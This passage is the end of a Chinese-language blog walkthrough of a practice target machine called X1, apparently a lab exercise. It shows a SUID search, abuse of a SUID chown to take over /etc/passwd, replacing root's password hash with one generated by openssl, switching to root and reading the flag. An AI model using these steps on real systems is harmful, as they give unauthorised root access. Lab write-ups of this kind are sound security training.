+                   <span class="pl-k">&lt;</span>match url=<span class="pl-s"><span class="pl-pds">"</span>(.*)<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>conditions logicalGrouping=<span class="pl-s"><span class="pl-pds">"</span>MatchAll<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+                     <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{URL}<span class="pl-pds">"</span></span> pattern=<span class="pl-s"><span class="pl-pds">"</span>^/index.php<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> negate=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                     <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{REQUEST_FILENAME}<span class="pl-pds">"</span></span> matchType=<span class="pl-s"><span class="pl-pds">"</span>IsFile<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> negate=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                     <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{REQUEST_FILENAME}<span class="pl-pds">"</span></span> matchType=<span class="pl-s"><span class="pl-pds">"</span>IsDirectory<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> negate=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>/conditions<span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>action type=<span class="pl-s"><span class="pl-pds">"</span>Rewrite<span class="pl-pds">"</span></span> url=<span class="pl-s"><span class="pl-pds">"</span>index.php<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span>/rule<span class="pl-k">&gt;</span>
+           <span class="pl-k">&lt;</span>/rules<span class="pl-k">&gt;</span>
+       <span class="pl-k">&lt;</span>/rewrite<span class="pl-k">&gt;</span>
+       <span class="pl-k">&lt;</span>httpProtocol<span class="pl-k">&gt;</span>
+           <span class="pl-k">&lt;</span>customHeaders<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span>add name=<span class="pl-s"><span class="pl-pds">"</span>X-Content-Type-Options<span class="pl-pds">"</span></span> value=<span class="pl-s"><span class="pl-pds">"</span>nosniff<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span><span class="pl-k">!</span>-- Protect against certain cross-origin requests. More information can be found here: --<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span><span class="pl-k">!</span>-- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy_(CORP) --<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span><span class="pl-k">!</span>-- https://web.dev/why-coop-coep/ --<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span><span class="pl-k">!</span>-- <span class="pl-k">&lt;</span>add name=<span class="pl-s"><span class="pl-pds">"</span>Cross-Origin-Resource-Policy<span class="pl-pds">"</span></span> value=<span class="pl-s"><span class="pl-pds">"</span>same-origin<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span> --<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span><span class="pl-k">!</span>-- <span class="pl-k">&lt;</span>add name=<span class="pl-s"><span class="pl-pds">"</span>Cross-Origin-Embedder-Policy<span class="pl-pds">"</span></span> value=<span class="pl-s"><span class="pl-pds">"</span>require-corp<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span> --<span class="pl-k">&gt;</span>
+           <span class="pl-k">&lt;</span>/customHeaders<span class="pl-k">&gt;</span>
+       <span class="pl-k">&lt;</span>/httpProtocol<span class="pl-k">&gt;</span>
+   <span class="pl-k">&lt;</span>/system.webServer<span class="pl-k">&gt;</span>
+   <span class="pl-k">&lt;</span>/location<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/configuration<span class="pl-k">&gt;</span></pre></div>
+<p>寻找SUID文件进行提权：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@X1:/var/www/html$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chown  <span class="pl-k">&lt;</span>-- 老朋友了！
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1</pre></div>
+<p>发现了 <code class="notranslate">/usr/bin/chown</code> 这个老朋友，并且有SUID权限。<br>
+查阅 GTFOBins (<a href="https://gtfobins.github.io/gtfobins/chown/#suid" rel="nofollow">https://gtfobins.github.io/gtfobins/chown/#suid</a>)：</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/22ec69ff42e6847a0d01bb8cfdd07fc64e990a7472fd6c5c305d11a3996426c0/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232333834303637302e77656270"><img src="https://camo.githubusercontent.com/22ec69ff42e6847a0d01bb8cfdd07fc64e990a7472fd6c5c305d11a3996426c0/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232333834303637302e77656270" alt="image-20250511223840468" data-canonical-src="https://7r1UMPH.top/image/20250511223840670.webp" style="max-width: 100%;"></a></p>
+<p>思路就是用 <code class="notranslate">chown</code> 把 <code class="notranslate">/etc/passwd</code> 的所有权改成 <code class="notranslate">www-data</code>，然后我们就可以编辑它，给root用户改个密码（或者直接添加一个带root权限的新用户）。</p>
+<p><strong>生成密码哈希：</strong><br>
+在Kali上用 <code class="notranslate">openssl</code> 生成一个密码 <code class="notranslate">888888</code> 的哈希：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ openssl passwd 888888   
+<span class="pl-smi">$1</span><span class="pl-smi">$FRnIm4sd$wXAhXRwWvKAL1viFFq</span>.9A1</pre></div>
+<p><strong>开始操作：</strong><br>
+在 <code class="notranslate">www-data</code> 的Shell里：</p>
+<ol>
+<li>
+<p>更改 <code class="notranslate">/etc/passwd</code> 的所有权：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@X1:/var/www/html/administrator$ chown www-data:www-data /etc/passwd</pre></div>
+</li>
+<li>
+<p>编辑 <code class="notranslate">/etc/passwd</code> (如果目标机上有 <code class="notranslate">nano</code> 或 <code class="notranslate">vi</code> 就方便多了，没有的话就得想办法把内容弄出来改了再覆盖回去)：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@X1:/var/www/html/administrator$ nano /etc/passwd</pre></div>
+<p>找到 <code class="notranslate">root</code> 用户那一行，通常是 <code class="notranslate">root:x:0:0:root:/root:/bin/bash</code>，把 <code class="notranslate">x</code> 替换成我们生成的哈希 <code class="notranslate">$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1</code>。<br>
+修改后变成：<code class="notranslate">root:$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1:0:0:root:/root:/bin/bash</code></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/124fadd5a3c1011468adccf1b001384fad8bde0b0c5501d75c25355ea15db0b9/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232343834303836332e77656270"><img src="https://camo.githubusercontent.com/124fadd5a3c1011468adccf1b001384fad8bde0b0c5501d75c25355ea15db0b9/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232343834303836332e77656270" alt="image-20250511224840653" data-canonical-src="https://7r1UMPH.top/image/20250511224840863.webp" style="max-width: 100%;"></a><br>
+保存退出。</p>
+</li>
+<li>
+<p>切换到 <code class="notranslate">root</code> 用户：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@X1:/var/www/html/administrator$ su -
+Password:  <span class="pl-c"><span class="pl-c">#</span> 输入 888888</span>
+root@X1:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+<p>成功拿到 root 权限！</p>
+</li>
+</ol>
+<h4>4. 读取最终的 Flag</h4>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@X1:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt</span>
+flag{root-72c0cd908b77fd5a4d0c988f7e002431}    </pre></div>
+<p>搞定！</p>
+<h3>四、总结</h3>
+<p>这个 X1 靶机，前期信息收集阶段那个 UDP 80 端口的"鲨鱼"提示确实有点意思，没注意到的话估计得卡一会儿（我就是那个冤种）。拿到 Joomla 后台凭据后，上传插件 getshell 属于常规操作。最后的 <code class="notranslate">chown</code> SUID 提权也是比较经典的利用方式。整体来说，确实是“比较简单”，但过程还是挺有趣的。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1umph.top/plugins/TOC.js'></script><script src='https://7r1umph.top/plugins/lightbox.js'></script><script src='https://7r1umph.top/plugins/LazyLoadImages.js'></script>
+
+</html>
